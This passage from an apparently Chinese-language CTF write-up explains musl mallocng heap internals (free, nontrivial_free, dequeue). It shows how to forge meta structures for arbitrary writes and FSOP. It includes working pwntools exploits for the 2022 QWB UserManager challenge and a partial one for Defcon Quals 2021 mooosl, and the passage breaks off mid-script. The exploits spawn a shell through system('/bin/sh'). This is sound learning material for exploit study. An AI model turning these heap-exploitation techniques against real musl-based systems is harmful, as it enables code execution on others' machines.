class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">step_seq();</span><br><span class="line">record_seq(sc);</span><br><span class="line">mi.base = g-&gt;mem;</span><br><span class="line">mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">mi = nontrivial_free(m, idx);</span><br><span class="line">&#125;</span><br><span class="line">free_meta(g);</span><br><span class="line"><span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结一下-1"><a href="#总结一下-1" class="headerlink" title="总结一下"></a>总结一下</h3><ol><li>获取 chunk 的 meta、idx、sc</li><li>检查 reserved</li><li>idx 和 reserved 置为 0xff，offset 置零</li><li>检查 avail_mask 和 freed_mask<ul><li>若存在 freed_chunk 且有其他的 inuse_chunk<ul><li>将 freed_mask 上该 chunk 对应的位置设为 1</li><li>结束 <code>free</code> 函数</li></ul></li><li>否则进入下一步</li></ul></li><li>调用 <code>nontrivial_free</code> 函数做进一步处理<ol><li>如果所有 chunk 都是 unuse_chunk<ul><li>如果 meta 的 next 存在，调用 <strong><code>dequeue</code></strong> 将 meta 从 ctx.active[sc] 中移出</li><li>free 掉 meta 和 group</li><li>结束 <code>free</code> 函数</li></ul></li><li>如果其他 chunk 都是 inuse_chunk 且 meta 不在 ctx.artive[sc] 中<ul><li>调用 <code>queue</code> 将 meta 放入 ctx.active[sc]</li></ul></li><li>将 freed_mask 上该 chunk 对应的位置设为 1</li></ol></li></ol><h2 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h2><h3 id="dequeue-1"><a href="#dequeue-1" class="headerlink" title="dequeue"></a>dequeue</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line"><span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*phead = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几乎没有任何检查，如果能够伪造 meta，可以任意地址写</p><p><strong>调用途径</strong></p><ul><li>malloc -&gt; try_avail -&gt; dequeue</li><li>free -&gt; nontrivial_free -&gt; dequeue</li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol><li>泄露一些重要信息<ul><li>大部分都可以从 malloc_context 中获取</li><li>libc 基址</li><li>secret</li></ul></li><li>伪造 meta_area、area、group、chunk<ul><li>下面是一些伪造的硬性要求或者建议</li><li>meta_area<ul><li>因为 get_meta 时会检查 secret 防止伪造，而检查时取 meta_area 地址是取 area 所在页的地址，因此伪造的 meta_area 地址后 12 位都要为 0，一般通过 mmap 伪造</li><li>check == malloc_context.secret</li></ul></li><li>area<ul><li>prev，next 改成想写的位置</li><li>mem == fake_group</li><li>last_idx == 0，一般只需要伪造一个 chunk，这样 free fake_chunk 时直接能进入 <code>nontrivial_free</code></li><li>avail_mask，freed_mask 全为 0 即可（因为只有一个将要 free 的 fake_chunk）</li><li>sc &lt; 48</li><li>freeable == 1</li><li>maplen != 0，否则在 <code>free_group</code> 会进行递归 free，随便取个值就行</li></ul></li><li>group<ul><li>meta == fake_meta</li><li>active_idx == 0</li></ul></li><li>chunk<ul><li>一般是 fake_fike 或者其他垃圾数据</li></ul></li></ul></li></ol><p>下面的例子是将 ofl_head 指向 fake_chunk（fake_file），exit 时就可以导致 FSOP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sc = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = p64(addr_fake_chunk) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(addr_ofl_head) <span class="comment"># next </span></span><br><span class="line">fake_meta += p64(addr_fake_group) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># avail &amp; freed mask</span></span><br><span class="line">fake_meta += p64(maplen &lt;&lt; <span class="number">12</span> | sc &lt;&lt; <span class="number">6</span> | freeable &lt;&lt; <span class="number">5</span> | last_idx)</span><br><span class="line"></span><br><span class="line">active_idx = <span class="number">0</span></span><br><span class="line">fake_group = p64(addr_fake_meta)</span><br><span class="line">fake_group += p64(active_idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_file</span></span><br><span class="line">fake_chunk = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">fake_chunk += p64(addr_system) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(secret) <span class="comment"># check</span></span><br><span class="line">fake_meta_area += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta_area += p64(<span class="number">1</span>) <span class="comment"># nsolts</span></span><br></pre></td></tr></table></figure><h2 id="2022-qwb-UserManager"><a href="#2022-qwb-UserManager" class="headerlink" title="2022 qwb UserManager"></a>2022 qwb UserManager</h2><p>这里只要会堆风水就行，不需要伪造就可以任意地址写一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">insert</span><span class="params">(User *newUser, User *users)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> ( users )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// UAF</span></span><br><span class="line">    <span class="keyword">if</span> ( newUser-&gt;id == users-&gt;id )</span><br><span class="line">&#123;</span><br><span class="line">newUser-&gt;flag = users-&gt;flag;</span><br><span class="line">newUser-&gt;leftUser = users-&gt;leftUser;</span><br><span class="line">newUser-&gt;rightUser = users-&gt;rightUser;</span><br><span class="line">newUser-&gt;parentUser = users-&gt;parentUser;</span><br><span class="line"><span class="keyword">if</span> ( users-&gt;leftUser )</span><br><span class="line">users-&gt;leftUser-&gt;parentUser = newUser;</span><br><span class="line"><span class="keyword">if</span> ( users-&gt;rightUser )</span><br><span class="line">users-&gt;rightUser-&gt;parentUser = newUser;</span><br><span class="line"><span class="keyword">if</span> ( users-&gt;parentUser != (User *)<span class="number">0xDEADBEEF</span>LL )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( users == users-&gt;parentUser-&gt;leftUser )</span><br><span class="line">users-&gt;parentUser-&gt;leftUser = newUser;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">users-&gt;parentUser-&gt;rightUser = newUser;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(users-&gt;name);</span><br><span class="line"><span class="built_in">free</span>(users);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在添加 user 的时候，如果有 id 相同的 user，会把原来的 user 释放掉，但是 users 会指向原来的 user，造成 UAF</p><ol><li>先泄露出 libc 和 elf 地址</li><li>上面的第 13 行可以任意地址写一次，把 ofl_head 修改到可控位置</li><li>伪造 fake_file</li><li>最后 exit 进行 FSOP</li></ol><p>最后写 fake_file 的时候要多次堆风水</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote(&#x27;&#x27;, )</span></span><br><span class="line">p = process(<span class="string">&#x27;./&#x27;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">addr_insert = elf.sym[<span class="string">&quot;insert&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span>, length, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Id: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;UserName: &quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Id: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Id: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui</span>(<span class="params">times=<span class="number">1</span>, length=<span class="number">0x8</span>, name=<span class="string">&quot;aaad\n&quot;</span>, <span class="built_in">id</span>=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        add(<span class="built_in">id</span>, length, name)</span><br><span class="line">        <span class="built_in">id</span> += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## leak addr</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x38</span>, <span class="string">&quot;aaad\n&quot;</span>) <span class="comment"># users</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x8</span>, <span class="string">&quot;aaad\n&quot;</span>)</span><br><span class="line">fengshui(<span class="number">6</span>)</span><br><span class="line">check(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">addr_elf = u64(p.recv(<span class="number">0x10</span>)[-<span class="number">8</span>:]) - <span class="number">0x5ca0</span></span><br><span class="line">addr_libc = u64(p.recv(<span class="number">0x20</span>)[-<span class="number">8</span>:]) - <span class="number">0xb7d60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&gt; addr_elf = &quot;</span>, <span class="built_in">hex</span>(addr_elf))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&gt; addr_libc = &quot;</span>, <span class="built_in">hex</span>(addr_libc))</span><br><span class="line"></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">addr_ofl_head = addr_libc + <span class="number">0xb6e48</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## write ofl_head to fake_file</span></span><br><span class="line">clear()</span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x38</span>, <span class="string">&quot;aaad\n&quot;</span>) <span class="comment"># users</span></span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x8</span>, <span class="string">&quot;aaad\n&quot;</span>)</span><br><span class="line">fengshui(<span class="number">6</span>)</span><br><span class="line">fake_user = p64(<span class="number">0x6873</span>) + p64(addr_libc + <span class="number">0xb7a60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) </span><br><span class="line">fake_user += p64(<span class="number">0xdeadbeef</span>) + p64(addr_ofl_head - <span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x38</span>, fake_user) <span class="comment"># user-&gt;name --&gt; users</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## construct fake_file</span></span><br><span class="line">clear()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x38</span>, p64(addr_system) * <span class="number">7</span>) <span class="comment"># ofl_head[0] = &quot;sh&quot;</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x8</span>, <span class="string">&quot;aaad\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x38</span>, p64(<span class="number">0</span>) * <span class="number">7</span>) <span class="comment"># ofl_head-&gt;lock = 0</span></span><br><span class="line">fengshui(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="number">0x38</span>, p64(addr_system) * <span class="number">7</span>) <span class="comment"># ofl_head-&gt;write = system</span></span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Defcon-Quals-2021-mooosl"><a href="#Defcon-Quals-2021-mooosl" class="headerlink" title="Defcon Quals 2021 mooosl"></a>Defcon Quals 2021 mooosl</h2><p>用的本地 libc，musl 1.2.2-4 amd64</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>一个典型的菜单题，存储 KV</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">KV</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *key;</span><br><span class="line">  <span class="type">char</span> *value;</span><br><span class="line">  __int64 key_size;</span><br><span class="line">  __int64 value_size;</span><br><span class="line">  __int64 hash;</span><br><span class="line">  KV *next_KV;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>store</strong></p><p>每次存储一个 KV，再申请 key 和 value 内存，计算 key 的 hash，取 hash 后 12 位将其放入 hash_map 中，用单链表存储 hash 后 12 位相同的 KV，头插法</p><p>可用于堆风水</p><p><strong>query</strong></p><p>先申请 key 内存，然后根据 key 的 hash 在 hash_map 中寻找对应的 KV，输出 value 内容，最后将 key 内存 free</p><p>可用于 堆风水</p><p><strong>delete</strong></p><p>先申请 key 内存，然后根据 key 的 hash 在 hash_map 中寻找对应的 KV，进行删除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kv = search(key, key_size);</span><br><span class="line"><span class="keyword">if</span> ( kv )</span><br><span class="line">&#123;</span><br><span class="line">    chain = &amp;hash_map[kv-&gt;hash &amp; <span class="number">0xFFF</span>];</span><br><span class="line">    <span class="comment">// 这里忽略了一个条件，当 kv 是链表尾的时候，上一个 kv 的 next_KV 没有置零，导致 UAF</span></span><br><span class="line">    <span class="keyword">if</span> ( kv == *chain || kv-&gt;next_KV )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ( kv != *chain )</span><br><span class="line">            chain = &amp;(*chain)-&gt;next_KV;</span><br><span class="line">        *chain = kv-&gt;next_KV;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(kv-&gt;key);</span><br><span class="line">    <span class="built_in">free</span>(kv-&gt;value);</span><br><span class="line">    <span class="built_in">free</span>(kv);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><ol><li>申请两个 hash 后 12 位相同的 kv，<code>delete</code> 后面一个造成 UAF</li><li>通过堆风水和 <code>query</code> 泄露出重要信息</li><li>再通过堆风水和 <code>delete</code>，伪造 meta_area，通过 unsafe_unlink 任意地址写<ul><li>主要是通过 <code>delete</code> 的 free(kv-&gt;key) 或 free(kv-&gt;value) 来 unlink</li><li>因为这两个指针可以任意写<del>（笔者想了好久死活没想出来）</del></li></ul></li><li>通过改写 ofl_head 指向伪造的 file 最后 exit 导致 FSOP<ul><li>下面是看别人 wp 是做法，要写三次，伪造三次<del>（逆天）</del></li><li>通过改写 stdout 的 write 函数指针为 <code>system</code> 和 flags 为 <code>/bin/sh\x00</code>，并使 wpos != wbase 即可导致 FSOP 拿到 shell</li></ul></li></ol><p>思路很简单，但是 exp 是真的难写😭😭</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">address = <span class="string">&quot;&quot;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">filename = <span class="string">&quot;./&quot;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line"><span class="comment"># p = remote(address[0], address[1])</span></span><br><span class="line">p = process(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-musl/libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key, value, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size == <span class="literal">None</span> :</span><br><span class="line">        key_size = <span class="built_in">len</span>(key)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(key_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> value_size == <span class="literal">None</span> :</span><br><span class="line">        value_size = <span class="built_in">len</span>(value)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(value_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size == <span class="literal">None</span> :</span><br><span class="line">        key_size = <span class="built_in">len</span>(key)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(key_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size == <span class="literal">None</span> :</span><br><span class="line">        key_size = <span class="built_in">len</span>(key)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(key_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">key</span>):</span><br><span class="line">vi = <span class="number">2021</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">vi = <span class="number">0x13377331</span> * vi + key[i]</span><br><span class="line"><span class="keyword">return</span> vi &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">key=<span class="string">b&quot;hhhh&quot;</span>, size=<span class="number">4</span></span>):</span><br><span class="line"><span 